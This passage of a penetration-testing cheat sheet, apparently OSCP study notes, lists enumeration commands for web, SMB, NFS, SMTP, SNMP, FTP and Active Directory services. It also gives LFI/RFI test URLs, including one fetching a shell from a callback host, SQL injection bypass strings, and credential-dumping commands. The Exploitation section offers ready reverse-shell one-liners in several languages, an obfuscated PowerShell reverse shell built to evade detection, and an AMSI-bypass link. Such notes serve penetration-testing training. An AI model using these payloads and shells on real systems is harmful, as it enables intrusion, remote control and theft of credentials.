
                <details>
                <summary>FFuF</summary>

                + 
                    <br></br>

                    ```
                    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "COOKIE VALUE; security=low" -u http://x.x.x.x
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-b</b>&ensp;--&ensp;</li>
                    <li><b>security=low</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x -fc 403, 302, 200
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-fc</b>&ensp;--&ensp;</li>
                    <br></br>
                   
                    ```
                    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "Host: x.x.x.x" -u http://x.x.x.x
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-H</b>&ensp;--&ensp;</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://x.x.x.x -timeout 5
                    ```
                    
                    <li><b>-w</b>&ensp;--&ensp;Wordlist</li>
                    <li><b>-u</b>&ensp;--&ensp;</li>
                    <li><b>-timeout</b>&ensp;--&ensp;</li>
                    <br></br>

                    <br></br>
                </details>

                <details>
                <summary>Burp Suite (Empty)</summary>

                + 
                    
                    <br></br>
                    <b>setup Proxy in Firefox</b>

                    ```
                    - Add Foxy Proxy extention within Firefox
                    - Select Options
                    - Select Add
                    - Title: BurpSuite
                    - Proxy IP Address or DNS name: 127.0.0.1
                    - Port: 8080
                    - Save
                    - Click Foxy Proxy and Select BurpSuite when Ready to use
                    ```
                    
                    <br></br>
                    <b>start BurpSuite "Agree,Temporary Project: Next,Use Burp defaults: Start Burp"</b>

                    ```
                    burpsuite
                    ```
                    
                    <br></br>
                    <b>Start Proxy on Burp</b>
                    
                    ```
                    - Proxy Tab
                    - Intercept
                    - Intercept is on
                    ```
                    
                </details>

                <details>
                <summary>OWASP ZAP (Empty)</summary>

                + 
                    <br></br>

                    ```
                    ```

                    <br></br>
                </details>

                <details>
                <summary>Cadaver (Empty)</summary>

                + 
                    <br></br>

                    ```
                    ```

                    <br></br>
                </details>

                <details>
                <summary>SQLMap (Empty)</summary>

                + 
                    <br></br>

                    ```
                    ```

                    <br></br>
                </details>

                <details>
                <summary>Joomscan (Empty)</summary>

                + 
                    <br></br>

                    ```
                    ```

                    <br></br>
                </details>

                <details>
                <summary>Feroxbuster (Empty)</summary>

                + 
                    <br></br>

                    ```
                    ```

                    <br></br>
                </details>
            </details>


            <details>
            <summary>File Intrusion</summary>

            + <details>
                <summary>LFI</summary>

                + 
                    <br></br>
                    <b>Testing for LFI</b>

                    ```
                    http://example.com/index.php?page=etc/passwd
                    ```
                    ```
                    http://example.com/index.php?page=etc/passwd
                    ```
                    ```
                    http://example.com/index.php?page=../../etc/passwd
                    ```
                    ```
                    http://example.com/index.php?page=%2e%2e%2f
                    ```
                    ```
                    http://example.com/index.php?page=....//....//etc/passwd
                    ```

                    <br></br>
                    <b>More Info</b>

                    ```
                    https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf
                    ```

                    <br></br>
                    <b>Interesting Linux Files</b>
                    
                    ```
                    /etc/passwd
                    ```
                    ```
                    /etc/shadow
                    ```
                    ```
                    /etc/issue
                    ```
                    ```
                    /etc/group
                    ```
                    ```
                    /etc/hostname
                    ```
                    ```
                    /etc/ssh/ssh_config
                    ```
                    ```
                    /etc/ssh/sshd_config
                    ```
                    ```
                    /root/.ssh/id_rsa
                    ```
                    ```
                    /root/.ssh/authorized_keys
                    ```
                    ```
                    /home/user/.ssh/authorized_keys
                    ```
                    ```
                    /home/user/.ssh/id_rsa
                    ```

                    <br></br>
                    <b>Interesting Windows Files</b>
                    
                    ```
                    /boot.ini
                    ```
                    ```
                    /autoexec.bat
                    ```
                    ```
                    /windows/system32/drivers/etc/hosts
                    ```
                    ```
                    /windows/repair/SAM
                    ```

                    <br></br>
                </details>

                <details>
                <summary>RFI</summary>

                + 
                    <br></br>
                    <b>Testing for RFI</b>

                    ```
                    http://example.com/index.php?page=http://callback.com/shell.txt
                    ```
                    ```
                    http://example.com/index.php?page=http:%2f%2fcallback.com%2fshell.txt
                    ```

                    <br></br>
                </details>
            </details>

            <details>
            <summary>SQL Injection</summary>

            + <details>
                <summary>SQL Map (Not Allowed on OSCP)</summary>

                + 
                    <br></br>
                    <b>Sqlmap Crawl</b>

                    ```
                    sqlmap -u http://172.21.0.0 --crawl=1
                    ```

                    <br></br>
                    <b>Sqlmap dump database</b>

                    ```
                    sqlmap -u http://172.21.0.0 --dbms=mysql --dump
                    ```

                    <br></br>
                    <b>Sqlmap shell</b>

                    ```
                    sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell
                    ```

                    <br></br>
                </details>

                <details>
                <summary>SQLi</summary>

                + 
                    <br></br>
                    <b>Testing for Bypasses</b>

                    ```
                    ' or 1=1 LIMIT 1 --
                    ```
                    ```
                    ' or 1=1 LIMIT 1 -- -
                    ```
                    ```
                    ' or 1=1 LIMIT 1#
                    ```
                    ```
                    'or 1#
                    ```
                    ```
                    ' or 1=1 --
                    ```
                    ```
                    ' or 1=1 -- -
                    ```

                    <br></br>
                    <b>Testing for a Row</b>

                    ```
                    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
                    ```

                    <br></br>
                </details>
            </details>
        </details>

        <details>
        <summary>SMB</summary>
        
        + <details>
            <summary>Enumerate SMB</summary>

            + <details>
                <summary>Enum4Linux</summary>

                + 
                    <br></br>

                    ```
                    enum4linux -a x.x.x.x
                    ```

                    <li><b>-a</b>&ensp;--&ensp;Do all simple enumeration (-U -S -G -P -r -o -n -i).</li>
                    <li><b>-U</b>&ensp;--&ensp;Get Userlist</li>
                    <li><b>-S</b>&ensp;--&ensp;Get Sharelist</li>
                    <li><b>-G</b>&ensp;--&ensp;Get Group and Member List</li>
                    <li><b>-P</b>&ensp;--&ensp;Get Password Policy Information</li>
                    <li><b>-r</b>&ensp;--&ensp;Enumerate Users via RID Cycling</li>
                    <li><b>-o</b>&ensp;--&ensp;Get OS Information</li>
                    <li><b>-n</b>&ensp;--&ensp;Do an nmblookup (Similar to NBTstat)</li>
                    <li><b>-i</b>&ensp;--&ensp;Get Printer Information</li>

                    <br></br>
                </details>
                
                <details>
                <summary>SMBmap</summary>

                + 
                    <br></br>
                    
                    ```
                    smbmap -H x.x.x.x -d [domain] -u [user] -p [password]
                    ```
                    ```
                    smbmap -H x.x.x.x -d [domain] -u "" -p ""
                    ```
                    
                    <li><b>-H</b>&ensp;--&ensp;Host</li>
                    <li><b>-d</b>&ensp;--&ensp;Domain</li>
                    <li><b>-u</b>&ensp;--&ensp;User</li>
                    <li><b>-p</b>&ensp;--&ensp;Password</li>
                    <br></br>
                </details>

                <details>
                <summary>Nmap</summary>

                + 
                    <br></br>
                    
                    ```
                    nmap --script smb-* -p 139,445 --script-args=unsafe=1 x.x.x.x
                    ```
                    ```
                    nmap --script smb-enum-* -p 139,445 x.x.x.x
                    ```

                    <li><b>--script</b>&ensp;--&ensp;Run .nse script</li>
                    <li><b>-p</b>&ensp;--&ensp;Port</li>
                    <li><b>--script-args=unsafe=1</b>&ensp;--&ensp;Unsafe to Run</li>

                    <br></br>
                    <b>SMB Script List</b>

                    ```
                    smb2-capabilities.nse
                    ```
                    ```
                    smb2-security-mode.nse
                    ```
                    ```
                    smb2-time.nse
                    ```
                    ```
                    smb2-vuln-uptime.nse
                    ```
                    ```
                    smb-brute.nse
                    ```
                    ```
                    smb-double-pulsar-backdoor.nse
                    ```
                    ```
                    smb-enum-domains.nse
                    ```
                    ```
                    smb-enum-groups.nse
                    ```
                    ```
                    smb-enum-processes.nse
                    ```
                    ```
                    smb-enum-services.nse
                    ```
                    ```
                    smb-enum-sessions.nse
                    ```
                    ```
                    smb-enum-shares.nse
                    ```
                    ```
                    smb-enum-users.nse
                    ```
                    ```
                    smb-flood.nse
                    ```
                    ```
                    smb-ls.nse
                    ```
                    ```
                    smb-mbenum.nse
                    ```
                    ```
                    smb-os-discovery.nse
                    ```
                    ```
                    smb-print-text.nse
                    ```
                    ```
                    smb-protocols.nse
                    ```
                    ```
                    smb-psexec.nse
                    ```
                    ```
                    smb-security-mode.nse
                    ```
                    ```
                    smb-server-stats.nse
                    ```
                    ```
                    smb-system-info.nse
                    ```
                    ```
                    smb-vuln-conficker.nse
                    ```
                    ```
                    smb-vuln-cve2009-3103.nse
                    ```
                    ```
                    smb-vuln-cve-2017-7494.nse
                    ```
                    ```
                    smb-vuln-ms06-025.nse
                    ```
                    ```
                    smb-vuln-ms07-029.nse
                    ```
                    ```
                    smb-vuln-ms08-067.nse
                    ```
                    ```
                    smb-vuln-ms10-054.nse
                    ```
                    ```
                    smb-vuln-ms10-061.nse
                    ```
                    ```
                    smb-vuln-ms17-010.nse
                    ```
                    ```
                    smb-vuln-regsvc-dos.nse
                    ```
                    ```
                    smb-vuln-webexec.nse
                    ```
                    ```
                    smb-webexec-exploit.nse
                    ```

                    <br></br>
                </details>

                <details>
                <summary>SMBclient</summary>
                
                + 
                    <br></br>
                    
                    ```
                    smbclient -L x.x.x.x
                    ```
                    
                    <li><b>-L</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    smbclient //x.x.x.x/tmp
                    ```
                    <br></br>
                    <b>Impacket SmbClient</b>

                    ```
                    /usr/share/doc/python3-impacket/examples/smbclient.py username@x.x.x.x
                    ```

                    <br></br>
                </details>

                <details>
                <summary>RPCclient</summary>
                
                + 
                    <br></br>
                    
                    ```
                    rpcclient -U "" -N x.x.x.x enumdomusers
                    ```

                    <li><b>-U</b>&ensp;--&ensp;</li>
                    <li><b>-N</b>&ensp;--&ensp;</li>
                    <li><b>enumdomusers</b>&ensp;--&ensp;</li>
                    <br></br>
                </details>

                <details>
                <summary>Impacket</summary>
                
                + 
                    <br></br>
                    
                    ```
                    python3 samdump.py SMB x.x.x.x
                    ```

                    <br></br>
                </details>

                <details>
                <summary>CrackMapExec</summary>
                
                + 
                    <br></br>
                    
                    ```
                    crackmapexec smb -L
                    ```
                    
                    <li><b>-L</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    crackmapexec x.x.x.x -u Administrator -H [hash] --local-auth
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;User</li>
                    <li><b>-H</b>&ensp;--&ensp;Hash</li>
                    <li><b>--local-auth</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    crackmapexec x.x.x.x -u Administrator -H [hash] --share
                    ```
                    
                    <li><b>-u</b>&ensp;--&ensp;User</li>
                    <li><b>-H</b>&ensp;--&ensp;Hash</li>
                    <li><b>--share</b>&ensp;--&ensp;</li>
                    <br></br>
                    
                    ```
                    crackmapexec smb x.x.x.0/24 -u user -p 'Password' --local-auth -M mimikatz
                    ```

                    <li><b>-u</b>&ensp;--&ensp;User</li>
                    <li><b>-u</b>&ensp;--&ensp;Password</li>
                    <li><b>--local-auth</b>&ensp;--&ensp;</li>
                    <li><b>-M</b>&ensp;--&ensp;</li>
                    <br></br>
                </details>
            </details>
        </details>
        
        <details>
        <summary>NFS</summary>
        
        + <details>
            <summary>Nmap</summary>
            
            +
                <br></br>
                <b>Check if System is running RPCbind or Portmapper</b>
                
                ```
                nmap -v -p 111 x.x.x.1-254
                ```
                
                <li><b>-v</b>&ensp;--&ensp;Verbose</li>
                <li><b>-p</b>&ensp;--&ensp;Port #</li>
                <br></br>
                
                <b>Find Services that may have been registered with rpcbind</b>
                
                ```
                nmap -sV -p 111 --script=rpcinfo x.x.x.1-254
                ```
                
                <li><b>-sV</b>&ensp;--&ensp;Service Version</li>
                <li><b>-p</b>&ensp;--&ensp;Port #</li>
                <li><b>--script=</b>&ensp;--&ensp;Run Script</li>
                <br></br>
                
                <b>If NFS Running</b>
                
                ```
                nmap -p 111 --script nfs* x.x.x.x
                ```
                
                <li><b>-p</b>&ensp;--&ensp;Port #</li>
                <li><b>--script=</b>&ensp;--&ensp;Run Script</li>
                <br></br>
                
                <b>NFS Scrips</b>
                
                ```
                /usr/share/nmap/scripts/nfs-ls.nse
                ```
                ```
                /usr/share/nmap/scripts/nfs-showmount.nse
                ```
                ```
                /usr/share/nmap/scripts/nfs-statfs.nse
                ```
                
                <br></br>
                
                <b>Mount Directory: NFS Sharing Directory? ex: /home</b>
                
                ```
                mkdir home && sudo mount -o nolock x.x.x.x:/home ~/home/
                ```
                
                <li><b>-o nolock</b>&ensp;--&ensp;Disable File Locking, Often needed for older NFS Servers</li>
                <br></br>
        </details>
         
        <details>
        <summary>SMTP</summary>
        
        + 
            <br></br>
            <b>Netcat into SMTP</b>
            
            ```
            nc -nv x.x.x.x 25
            ```
            
            <br></br>
            <b>Commands to SMTP within Netcat Connection: Verify an Email Address</b>
            
            ```
            VRFY root
            ```
            <li><b>root</b>&ensp;--&ensp;Can be exchanged with any user as long as it exists</li>
            
            <br></br>
            <b>Commands to SMTP within Netcat Connection: Membership of Mailing List</b>
            
            ```
            EXPN
            ```
            
            <br></br>
            <b>Python Script for Automating VRFY Command on User</b>
            
            ```
            #!/usr/bin/python

            import socket
            import sys
            
            username =
            Rhost = x.x.x.x

            if len(sys.argv) != 2:
                    print "Usage: vrfy.py username"
                    sys.exit(0)

            # Create a Socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the Server
            connect = s.connect(('Rhost',25))

            # Receive the banner
            banner = s.recv(1024)

            print banner

            # VRFY a user
            s.send('VRFY ' + sys.argv[1] + '\r\n')
            result = s.recv(1024)

            print result

            # Close the socket
            s.close()
            ```

        
        </details>

        <details>
        <summary>Active Directory</summary>
        
        + <details>
            <summary>Anonymous Credential LDAP Dumping</summary>
            
            + 
                <br></br>

                ```
                ldapsearch -LLL -x -H ldap:// <domain fqdn="">-b ‘’ -s base ‘(objectclass=*)’</domain>
                ```
                
                <li><b>-LLL</b>&ensp;--&ensp;</li>
                <li><b>-x</b>&ensp;--&ensp;</li>
                <li><b>-H</b>&ensp;--&ensp;</li>
                <li><b>-s</b>&ensp;--&ensp;</li>
                <br></br>
            </details>

            <details>
            <summary>Impacket</summary>
            
            + 
                <br></br>
                <b>Impacket GetADUsers.py (Must have valid credentials)</b>

                ```
                GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
                ```

                <li><b>-all</b>&ensp;--&ensp;</li>
                <li><b>-dc-ip</b>&ensp;--&ensp;</li>
                <br></br>
                
                <b>Impacket lookupsid.py:</b>

                ```
                /usr/share/doc/python3-impacket/examples/lookupsid.py username:password@x.x.x.x
                ```

                <br></br>
                <b>Impacket Secretdump:</b>

                ```
                python3 secretdump.py 'breakme.local/Administrator@x.x.x.x' -just-dc-user anakin
                ```
                <li><b>-just-dc-user</b>&ensp;--&ensp;</li>
                <br></br>

                <br></br>
            </details>

            <details>
            <summary>Windapsearch</summary>
            
            + 
                <br></br>

                ```
                python3 windapsearch.py -d host.domain -u domain\ldapbind -p PASSWORD -U
                ```

                <li><b>-d</b>&ensp;--&ensp;</li>
                <li><b>-u</b>&ensp;--&ensp;</li>
                <li><b>-p</b>&ensp;--&ensp;Password</li>
                <li><b>-U</b>&ensp;--&ensp;</li>
                <br></br>
                
                <b>Download Link</b>

                ```
                https://github.com/ropnop/windapsearch
                ```

            </details>
        </details>

        <details>
        <summary>SNMP</summary>
        
        + <details>
            <summary>SNMP Walk</summary>
            
            + 
                <br></br>
                <b>Enumerate Entire MIB Tree</b>

                ```
                snmpwalk -c public -v1 -t 10 x.x.x.x
                ```
                ```
                snmpwalk -c private -v1 -t 10 x.x.x.x
                ```
                ```
                snmpwalk -c manager -v1 -t 10 x.x.x.x
                ```

                <li><b>-c</b>&ensp;--&ensp;Community</li>
                <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
                <li><b>-t</b>&ensp;--&ensp;Increases Timeout to 10 Seconds</li>
               
               <br></br>
                <b>Enumerate Windows Users</b>

                ```
                snmpwalk -c public -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
                ```
                ```
                snmpwalk -c private -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
                ```
                ```
                snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.4.1.77.1.2.25
                ```

                <li><b>-c</b>&ensp;--&ensp;Community</li>
                <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
                
                <br></br>
                <b>Enumerate Running Windows Processes</b>

                ```
                snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
                ```
                ```
                snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
                ```
                ```
                snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.25.4.2.1.2
                ```

                <li><b>-c</b>&ensp;--&ensp;Community</li>
                <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
                
                <br></br>
                <b>Enumerate Open TCP Ports</b>

                ```
                snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
                ```
                ```
                snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
                ```
                ```
                snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.6.13.1.3
                ```

                <li><b>-c</b>&ensp;--&ensp;Community</li>
                <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
                
                <br></br>
                <b>Enumerate Installed Software</b>

                ```
                snmpwalk -c public -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
                ```
                ```
                snmpwalk -c private -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
                ```
                ```
                snmpwalk -c manager -v1 x.x.x.x 1.3.6.1.2.1.25.6.3.1.2
                ```

                <li><b>-c</b>&ensp;--&ensp;Community</li>
                <li><b>-v1</b>&ensp;--&ensp;SNMP Version Number</li>
            </details>

            <details>
            <summary>Nmap</summary>
            
            + 
                <br></br>

                ```
                nmap x.x.x.x -Pn -sU -p 161 --script=
                ```

                <li><b>-Pn</b>&ensp;--&ensp;Disable Host Discovery</li>
                <li><b>-sU</b>&ensp;--&ensp;UDP Scan</li>
                <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
                <li><b>--script=</b>&ensp;--&ensp;Script Scan using the comma-separated list of filenames</li>
                <br></br>

                <br></br>
                <b>List of SNMP.nse Scripts</b>

                ```
                /usr/share/nmap/scripts/snmp-brute.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-hh3c-logins.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-info.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-interfaces.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-ios-config.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-netstat.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-processes.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-sysdescr.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-win32-services.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-win32-shares.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-win32-software.nse
                ```
                ```
                /usr/share/nmap/scripts/snmp-win32-users.nse
                ```

                <br></br>
                
            </details>

            <details>
            <summary>Metasploit aux Modules</summary>
            
            + 
                <br></br>

                ```
                auxliary/scanner/misc/oki_scanner
                ```
                ```
                auxiliary/scanner/snmp/aix_version
                ```
                ```
                auxiliary/scanner/snmp/arris_dg950
                ```
                ```
                auxiliary/scanner/snmp/brocade_enumhash
                ```
                ```
                auxiliary/scanner/snmp/cisco_config_tftp
                ```
                ```
                auxiliary/scanner/snmp/cisco_upload_file
                ```
                ```
                auxiliary/scanner/snmp/cnpilot_r_snmp_loot
                ```
                ```
                auxiliary/scanner/snmp/epmp1000_snmp_loot
                ```
                ```
                auxiliary/scanner/snmp/netopia_enum
                ```
                ```
                auxiliary/scanner/snmp/sbg6580_enum
                ```
                ```
                auxiliary/scanner/snmp/snmp_enum
                ```
                ```
                auxiliary/scanner/snmp/snmp_enum_hp_laserjet
                ```
                ```
                auxiliary/scanner/snmp/snmp_enumshares
                ```
                ```
                auxiliary/scanner/snmp/snmp_enumusers
                ```
                ```
                auxiliary/scanner/snmp/snmp_login
                ```

                <br></br>
            </details>

            <details>
            <summary>Onesixtyone</summary>
            
            + 
                <br></br>

                ```
                onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i ip_list
                ```

                <li><b>-c</b>&ensp;--&ensp;Communities</li>
                <li><b>-i</b>&ensp;--&ensp;IP List</li>
                <br></br>
            </details>

            <details>
            <summary>SNMP-Check</summary>
            
            + 
                <br></br>

                ```
                snmp-check x.x.x.x -c public
                ```

                <li><b>-c</b>&ensp;--&ensp;</li>
                <br></br>
            </details>

            <details>
            <summary>Impacket</summary>
            
            + 
                <br></br>

                ```
                python3 samdump.py SNMP x.x.x.x
                ```

                <br></br>
            </details>
        </details>

        <details>
        <summary>FTP</summary>
        
        + <details>
            <summary>FTP</summary>
            
            + 
                <br></br>
                <b>Connect Via Terminal</b>

                ```
                ftp x.x.x.x
                ```

                <br></br>
                <b>Connect Via Browser</b>

                ```
                ftp://x.x.x.x 21
                ```

                <br></br>
            </details>

            <details>
            <summary>Nmap Enumeration</summary>
            
            + 
                <br></br>

                ```
                nmap x.x.x.x -p 21 -sV --script=exampleScript1.nse,exampleScript2.exe
                ```

                <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
                <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
                <li><b>--script</b>&ensp;--&ensp;Script Scan using the comma-separated list of filenames</li>
                <br></br>

                <br></br>
                <b>FTP Scripts</b>

                ```
                /usr/share/nmap/scripts/ftp-anon.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-bounce.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-brute.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-libopie.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-syst.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
                ```
                ```
                /usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
                ```
                ```
                /usr/share/nmap/scripts/tftp-enum.nse
                ```

            </details>
        </details>
    </details>
</details>

<details>
<summary>Exploitation</summary>

+ <details>
    <summary>General Notes</summary>
    
    + <details>
        <summary>Pre-requisites for Running Exploits</summary>
        
        + 
            <li><b>1. Check the version of the operating system.</b></li>
            <li><b>2. Check the software version.</b></li>
            <li><b>3. Check if there is exploit for it (Searchsploit, ExploitDB, Google, etc).</b></li>
            <li><b>4. If you have an exploit, is there a Metasploit Module for it?</b></li>
            <br></br>
        </details>

        <details>
        <summary>Default Credentials</summary>
        
        + 
            <br></br>

            ```
            https://cirt.net/passwords
            ```
            ```
            https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
            ```

            <br></br>
        </details>

        <details>
        <summary>Reverse Shells</summary>
        
        + 
            <br></br>
            <b>Bash</b>

            ```
            bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
            ```

            <br></br>
            <b>Perl</b>

            ```
            perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
            ```

            <br></br>
            <b>Python</b>

            ```
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
            ```

            <br></br>
            <b>IPv6</b>

            ```
            python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
            ```

            <br></br>
            <b>Ruby</b>

            ```
            ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
            ```
            ```
            ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
            ```

            <br></br>
            <b>PHP</b>

            ```
            php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
            ```
            ```
            /usr/share/webshells/php/php-reverse-shell.php
            ```
            ```
            http://pentestmonkey.net/tools/web-shells/php-reverse-shell
            ```

            <br></br>
            <b>Windows Powershell Oneliner:</b> Replace IP Address with number values in Check.for.Callback.Connection. To change the port pick your own numeric values to equal the number you want your shell to callback to you.

            ```
            # Offsec-callback-v2
            $ezYSZf = & ((Get-Command "New-ScheduledJobOption").name[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Check.for.Callback.Connection".Replace("Check",127).Replace("For",0+255-255).Replace("Callback", 0+234-234).Replace("Connection",0+0+0+1),(443*2-443));
            $VXm = $ezYSZf.GetStream();
            # checkin to target
            [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
            while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
            {;
            $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
            $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
            # AND
            $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
            $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
            $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
            };
            Start-Sleep -Seconds 5
            # checkout of target
            $ezYSZf.Close()
            ```

            <br></br>
            <b>Linux Powershell Oneliner:</b>

            ```
            $ezYSZf = & (("New-ScheduledJobOption")[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Stay.Off.Ronins.Lawn".Replace("Stay",127).Replace("Off",0+255-255).Replace("Ronins", 0+1-1).Replace("Lawn",0+0+0+1),(443*2-443));
            $VXm = $ezYSZf.GetStream();
            [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
            while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
            {;
            $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
            $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
            $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
            $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
            $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
            };
            $ezYSZf.Close()
            ```

            <br></br>
            <b>Golang</b>

            ```
            echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
            ```

            <br></br>
            <b>AWK</b>

            ```
            awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
            ```

            <br></br>
            <b>Other Shells</b>

            ```
            https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md
            ```

            <br></br>
            <b>Other Resources</b>

            ```
            Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
            ```

            <br></br>
        </details>
    </details>
    
    <details>
    <summary>File Permission Exploitations</summary>

    +
        <br></br>
